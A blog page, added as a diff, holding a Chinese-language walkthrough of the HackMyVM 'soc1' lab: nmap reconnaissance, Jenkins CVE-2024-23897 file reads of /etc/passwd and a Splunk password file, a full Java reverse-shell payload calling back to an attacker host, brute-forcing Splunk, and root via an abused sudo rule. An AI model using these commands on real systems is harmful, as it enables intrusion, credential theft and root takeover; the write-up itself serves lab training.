@@ -1,0 +1,718 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/icon.jpg">
+  <link rel="icon" href="/img/icon.jpg">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Skyarrow">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="复盘。 信息收集 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768![vmware_8R2SzRNwf2](2025-11&#x2F;vmware_8R2SzRNwf2.png)nmap 192.168.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackMyvm-soc1">
+<meta property="og:url" content="http://example.com/2025/11/06/HackMyvm-soc1/index.html">
+<meta property="og:site_name" content="Skyarrow&#39;s blog">
+<meta property="og:description" content="复盘。 信息收集 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768![vmware_8R2SzRNwf2](2025-11&#x2F;vmware_8R2SzRNwf2.png)nmap 192.168.">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2025/11/06/HackMyvm-soc1/vmware_8R2SzRNwf2.png">
+<meta property="og:image" content="http://example.com/2025/11/06/HackMyvm-soc1/cloudmusic_zaZPoTSgSX.png">
+<meta property="og:image" content="http://example.com/2025/11/06/HackMyvm-soc1/vmware_J8ABxGDhGX.png">
+<meta property="og:image" content="http://example.com/2025/11/06/HackMyvm-soc1/msedge_7mlCHRzNRQ.png">
+<meta property="og:image" content="http://example.com/2025/11/06/HackMyvm-soc1/vmware_waTjICpkYR.png">
+<meta property="og:image" content="http://example.com/2025/11/06/HackMyvm-soc1/msedge_beVOr0i9OJ.png">
+<meta property="og:image" content="http://example.com/2025/11/06/HackMyvm-soc1/msedge_b2uwyj9K8Q.png">
+<meta property="og:image" content="http://example.com/2025/11/06/HackMyvm-soc1/vmware_rGyH6zWVJy.png">
+<meta property="og:image" content="http://example.com/2025/11/06/HackMyvm-soc1/vmware_PvrbcCrVbe.png">
+<meta property="og:image" content="http://example.com/2025/11/06/HackMyvm-soc1/vmware_PHX4QRbrnC.png">
+<meta property="article:published_time" content="2025-11-05T23:57:42.000Z">
+<meta property="article:modified_time" content="2025-11-06T01:26:45.380Z">
+<meta property="article:author" content="Skyarrow">
+<meta property="article:tag" content="渗透">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/2025/11/06/HackMyvm-soc1/vmware_8R2SzRNwf2.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>HackMyvm-soc1 - Skyarrow&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Skyarrow&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>Links</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/card_normal.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="HackMyvm-soc1"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-11-06 07:57" pubdate>
+          November 6, 2025 am
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.7k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          15 mins
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> views
+        </span>
+        
+
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">HackMyvm-soc1</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>复盘。</p>
+<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><hr>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs shell">![vmware_8R2SzRNwf2](2025-11/vmware_8R2SzRNwf2.png)nmap 192.168.56.181  -A -p1-30000 --min-rate=1000<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-05 18:54 EST<br>Nmap scan report for 192.168.56.181<br>Host is up (0.00074s latency).<br>Not shown: 29994 closed tcp ports (reset)<br>PORT     STATE SERVICE         VERSION<br>22/tcp   open  ssh             OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)<br>| ssh-hostkey: <br>|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)<br>|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)<br>|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)<br>80/tcp   open  http            Apache httpd 2.4.62 ((Debian))<br>|_http-server-header: Apache/2.4.62 (Debian)<br>|_http-title: Site doesn&#x27;t have a title (text/html; charset=UTF-8).<br>8000/tcp open  http            Splunkd httpd<br>| http-robots.txt: 1 disallowed entry <br>|_/<br>|_http-server-header: Splunkd<br>| http-title: Site doesn&#x27;t have a title (text/html; charset=UTF-8).<br>|_Requested resource was http://192.168.56.181:8000/en-US/account/login?return_to=%2Fen-US%2F<br>8080/tcp open  http            Jetty 10.0.18<br>| http-robots.txt: 1 disallowed entry <br>|_/<br>| http-open-proxy: Potentially OPEN proxy.<br>|_Methods supported:CONNECTION<br>|_http-title: Dashboard [Jenkins]<br>|_http-server-header: Jetty(10.0.18)<br>8089/tcp open  ssl/http        Splunkd httpd<br>| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser<br>| Not valid before: 2025-10-13T11:00:50<br>|_Not valid after:  2028-10-12T11:00:50<br>|_http-title: splunkd<br>| http-robots.txt: 1 disallowed entry <br>|_/<br>|_http-server-header: Splunkd<br>8191/tcp open  limnerpressure?<br>| fingerprint-strings: <br>|   FourOhFourRequest, GetRequest: <br>|     HTTP/1.0 200 OK<br>|     Connection: close<br>|     Content-Type: text/plain<br>|     Content-Length: 85<br>|_    looks like you are trying to access MongoDB over HTTP on the native driver port.<br>1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :<br>SF-Port8191-TCP:V=7.94SVN%I=7%D=11/5%Time=690BE3C6%P=x86_64-pc-linux-gnu%r<br>SF:(GetRequest,A9,&quot;HTTP/1\.0\x20200\x20OK\r\nConnection:\x20close\r\nConte<br>SF:nt-Type:\x20text/plain\r\nContent-Length:\x2085\r\n\r\nIt\x20looks\x20l<br>SF:ike\x20you\x20are\x20trying\x20to\x20access\x20MongoDB\x20over\x20HTTP\<br>SF:x20on\x20the\x20native\x20driver\x20port\.\r\n&quot;)%r(FourOhFourRequest,A9<br>SF:,&quot;HTTP/1\.0\x20200\x20OK\r\nConnection:\x20close\r\nContent-Type:\x20te<br>SF:xt/plain\r\nContent-Length:\x2085\r\n\r\nIt\x20looks\x20like\x20you\x20<br>SF:are\x20trying\x20to\x20access\x20MongoDB\x20over\x20HTTP\x20on\x20the\x<br>SF:20native\x20driver\x20port\.\r\n&quot;);<br>MAC Address: 08:00:27:A8:61:DC (Oracle VirtualBox virtual NIC)<br>Device type: general purpose<br>Running: Linux 4.X|5.X<br>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5<br>OS details: Linux 4.15 - 5.8, Linux 5.0 - 5.5<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>TRACEROUTE<br>HOP RTT     ADDRESS<br>1   0.74 ms 192.168.56.181<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap done: 1 IP address (1 host up) scanned in 60.10 seconds<br><br></code></pre></td></tr></table></figure>
+
+<p>开放的端口有点多，一个一个筛。</p>
+<p>80端口是个欢迎界面，没有其他的东西。</p>
+<p>8000端口是登录界面，似乎用了某个cms，同时有robots，但没东西。</p>
+<p><img src="/2025/11/06/HackMyvm-soc1/vmware_8R2SzRNwf2.png" srcset="/img/loading.gif" lazyload></p>
+<p>8080端口是Jenkins的界面，同时泄露了一个用户test，并且发现版本号为2.441</p>
+<p><img src="/2025/11/06/HackMyvm-soc1/cloudmusic_zaZPoTSgSX.png" srcset="/img/loading.gif" lazyload></p>
+<p>8191是mongodb。</p>
+<p><img src="/2025/11/06/HackMyvm-soc1/vmware_J8ABxGDhGX.png" srcset="/img/loading.gif" lazyload></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/hcja666/article/details/145358423">CVE-2024-23897-Jenkins任意文件读取漏洞复现-CSDN博客</a></p>
+<p>刚刚的Jenkins有任意文件读取漏洞。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">java -jar jenkins-cli.jar -s http://192.168.56.181:8080/ -http help 1 &quot;@etc/passwd&quot;<br><br>ERROR: Too many arguments: root:x:0:0:root:/root:/bin/bash<br>java -jar jenkins-cli.jar help [COMMAND]<br>Lists all the available commands or a detailed description of single command.<br> COMMAND : Name of the command (default: 1)<br><br></code></pre></td></tr></table></figure>
+
+<p>确认存在漏洞，但好像读的不全。</p>
+<p>换一条命令试试。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs shell"> java -jar jenkins-cli.jar -s http://192.168.56.181:8080/  connect-node &quot;@etc/passwd&quot; <br><br>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin: No such agent &quot;mail:x:8:8:mail:/var/mail:/usr/sbin/nologin&quot; exists.<br>_apt:x:100:65534::/nonexistent:/usr/sbin/nologin: No such agent &quot;_apt:x:100:65534::/nonexistent:/usr/sbin/nologin&quot; exists.<br>systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin: No such agent &quot;systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin&quot; exists.<br>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin: No such agent &quot;gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin&quot; exists.<br>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin: No such agent &quot;irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin&quot; exists.<br>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin: No such agent &quot;list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin&quot; exists.<br>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin: No such agent &quot;man:x:6:12:man:/var/cache/man:/usr/sbin/nologin&quot; exists.<br>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin: No such agent &quot;daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin&quot; exists.<br>sys:x:3:3:sys:/dev:/usr/sbin/nologin: No such agent &quot;sys:x:3:3:sys:/dev:/usr/sbin/nologin&quot; exists.<br>jenkins:x:1001:1001:,,,:/home/jenkins:/bin/bash: No such agent &quot;jenkins:x:1001:1001:,,,:/home/jenkins:/bin/bash&quot; exists.<br>sync:x:4:65534:sync:/bin:/bin/sync: No such agent &quot;sync:x:4:65534:sync:/bin:/bin/sync&quot; exists.<br>systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin: No such agent &quot;systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin&quot; exists.<br>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin: No such agent &quot;www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin&quot; exists.<br>splunk:x:1000:1000:,,,:/home/splunk:/bin/bash: No such agent &quot;splunk:x:1000:1000:,,,:/home/splunk:/bin/bash&quot; exists.<br>systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin: No such agent &quot;systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin&quot; exists.<br>systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin: No such agent &quot;systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin&quot; exists.<br>root:x:0:0:root:/root:/bin/bash: No such agent &quot;root:x:0:0:root:/root:/bin/bash&quot; exists.<br>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin: No such agent &quot;backup:x:34:34:backup:/var/backups:/usr/sbin/nologin&quot; exists.<br>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin: No such agent &quot;nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin&quot; exists.<br>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin: No such agent &quot;lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin&quot; exists.<br>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin: No such agent &quot;uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin&quot; exists.<br>bin:x:2:2:bin:/bin:/usr/sbin/nologin: No such agent &quot;bin:x:2:2:bin:/bin:/usr/sbin/nologin&quot; exists.<br>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin: No such agent &quot;news:x:9:9:news:/var/spool/news:/usr/sbin/nologin&quot; exists.<br>sshd:x:105:65534::/run/sshd:/usr/sbin/nologin: No such agent &quot;sshd:x:105:65534::/run/sshd:/usr/sbin/nologin&quot; exists.<br>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin: No such agent &quot;proxy:x:13:13:proxy:/bin:/usr/sbin/nologin&quot; exists.<br>messagebus:x:104:110::/nonexistent:/usr/sbin/nologin: No such agent &quot;messagebus:x:104:110::/nonexistent:/usr/sbin/nologin&quot; exists.<br>games:x:5:60:games:/usr/games:/usr/sbin/nologin: No such agent &quot;games:x:5:60:games:/usr/games:/usr/sbin/nologin&quot; exists.<br><br>ERROR: Error occurred while performing this command, see previous stderr output.<br><br></code></pre></td></tr></table></figure>
+
+<p>这就齐全多了，确定存在用户Jenkins和splunk。</p>
+<p>读取user flag。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"> java -jar jenkins-cli.jar -s http://192.168.56.181:8080/  connect-node &quot;@home/splunk/user.txt&quot;<br><br><br>ERROR: No such agent &quot;flag&#123;69cd83075bb1066518625e09aac400711cd31ce7&#125;&quot; exists.<br></code></pre></td></tr></table></figure>
+
+<h3 id="GetJenkins"><a href="#GetJenkins" class="headerlink" title="GetJenkins"></a>GetJenkins</h3><hr>
+<p>查阅资料得知splunk的密码文件内容位置。</p>
+<p><a target="_blank" rel="noopener" href="https://splunk.my.site.com/customer/s/article/What-to-do-if-a-customer-forgets-the-Admin-password-in-Onprem">Widget</a></p>
+<p><img src="/2025/11/06/HackMyvm-soc1/msedge_7mlCHRzNRQ.png" srcset="/img/loading.gif" lazyload></p>
+<p>读取密码文件。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs 社联">java -jar jenkins-cli.jar -s http://192.168.56.181:8080/  connect-node &quot;@opt/splunk/etc/passwd.old&quot;<br><br>test:test1234: No such agent &quot;test:test1234&quot; exists.<br>grep -R &#x27;splunk&#x27;: No such agent &quot;grep -R &#x27;splunk&#x27;&quot; exists.<br>Administrator passwords can be found under the seclists/Passwords folder.: No such agent &quot;Administrator passwords can be found under the seclists/Passwords folder.&quot; exists.<br><br>ERROR: Error occurred while performing this command, see previous stderr output.<br><br></code></pre></td></tr></table></figure>
+
+<p>得到一个账密，同时前面已经知道Jenkins有用户test，合理怀疑是Jenkins的账户。</p>
+<p>成功登录。</p>
+<p><img src="/2025/11/06/HackMyvm-soc1/vmware_waTjICpkYR.png" srcset="/img/loading.gif" lazyload></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/benshu_001/article/details/137786384">DevOps（五）Jenkins图形化界面介绍_jenkins dashboard-CSDN博客</a></p>
+<p><img src="/2025/11/06/HackMyvm-soc1/msedge_beVOr0i9OJ.png" srcset="/img/loading.gif" lazyload></p>
+<p>发现命令行界面，准备反弹shell。</p>
+<p><img src="/2025/11/06/HackMyvm-soc1/msedge_b2uwyj9K8Q.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">String host=&quot;192.168.56.104&quot;;int port=4444;String cmd=&quot;/bin/bash&quot;;Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed())&#123;while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try &#123;p.exitValue();break;&#125;catch (Exception e)&#123;&#125;&#125;;p.destroy();s.close();<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/11/06/HackMyvm-soc1/vmware_rGyH6zWVJy.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">jenkins@SOC:/$ sudo -l<br>Matching Defaults entries for jenkins on SOC:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User jenkins may run the following commands on SOC:<br>    (ALL) NOPASSWD: /opt/splunk/bin/splunk search *<br>    (ALL) NOPASSWD: /opt/splunk/bin/splunk restart<br><br></code></pre></td></tr></table></figure>
+
+<h3 id="GetSplunk-复现"><a href="#GetSplunk-复现" class="headerlink" title="GetSplunk(复现)"></a>GetSplunk(复现)</h3><hr>
+<p>通过查找相关cve得到一个poc</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/nathan31337/Splunk-RCE-poc">nathan31337&#x2F;Splunk-RCE-poc</a></p>
+<p>同时该漏洞相关的web.conf 是可写的。</p>
+<p>但是得先知道splunk的密码。</p>
+<p>通过爆破（kali自带字典）得到splunk的账密为splunk:splunk123</p>
+<p><img src="/2025/11/06/HackMyvm-soc1/vmware_PvrbcCrVbe.png" srcset="/img/loading.gif" lazyload></p>
+<p>先改好配置之后再重启，重启得花些时间让web服务跑起来。</p>
+<p><img src="/2025/11/06/HackMyvm-soc1/vmware_PHX4QRbrnC.png" srcset="/img/loading.gif" lazyload></p>
+<p>由于splunk可写，直接把相关命令替换成提权的</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">splunk@SOC:/opt/splunk/etc/apps/search/bin$ <span class="hljs-built_in">rm</span> /opt/splunk/bin/splunk<br><span class="hljs-built_in">rm</span>: remove write-protected regular file <span class="hljs-string">&#x27;/opt/splunk/bin/splunk&#x27;</span>? <span class="hljs-built_in">yes</span><br>splunk@SOC:/opt/splunk/etc/apps/search/bin$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;chmod +s /bin/bash&quot;</span> &gt; /opt/splunk/bin/splunk<br>splunk@SOC:/opt/splunk/etc/apps/search/bin$ <span class="hljs-built_in">chmod</span> +x /opt/splunk/bin/splunk<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">jenkins@SOC:/opt/splunk/etc/system/default$ sudo /opt/splunk/bin/splunk restart<br>jenkins@SOC:/opt/splunk/etc/system/default$ bash -p<br>bash-5.0# id<br>uid=1001(jenkins) gid=1001(jenkins) euid=0(root) egid=0(root) groups=0(root),1001(jenkins)<br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E6%B8%97%E9%80%8F/" class="print-no-link">#渗透</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>HackMyvm-soc1</div>
+      <div>http://example.com/2025/11/06/HackMyvm-soc1/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>Skyarrow</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>November 6, 2025</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
